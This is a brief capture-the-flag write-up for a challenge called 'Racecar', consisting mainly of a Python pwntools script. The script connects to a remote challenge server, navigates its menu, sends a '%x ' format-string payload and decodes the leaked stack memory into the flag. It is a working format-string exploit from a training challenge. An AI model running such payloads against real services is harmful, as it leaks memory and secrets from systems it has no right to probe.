# Racecar

* This challenge contains a simple format string exploit. Further instructions can be found in [my pentest repo](https://git.stefan.works/whx/pentest_tools/src/branch/master/Exploits/Binaries/Format%20String.md)

```python
p = remote('178.62.88.151',31280)

p.recv()
p.sendline(b'whackx')
p.recv()
p.sendline(b'whackx')

print(p.recv())
p.sendline(b'1')
print(p.recv())
p.sendline(b'2')
print(p.recv())
p.sendline(b'1')
print(p.recv())
p.sendline(b'2')

print(p.recv())
p.sendline(b'%x ' *100)
print("[+] send payload")

l = p.recvall()
l =l.split(b'm\n')
l = l[-1].split()
res = []
for x in l[::-1]:
    try:
        #print(bytes.fromhex(x.split()[0].decode())[::-1])
        x = bytes.fromhex(x.decode())[::-1]
        res.append(x.decode())
    except:
        pass
print(''.join(res[::-1]))
p.close()
```

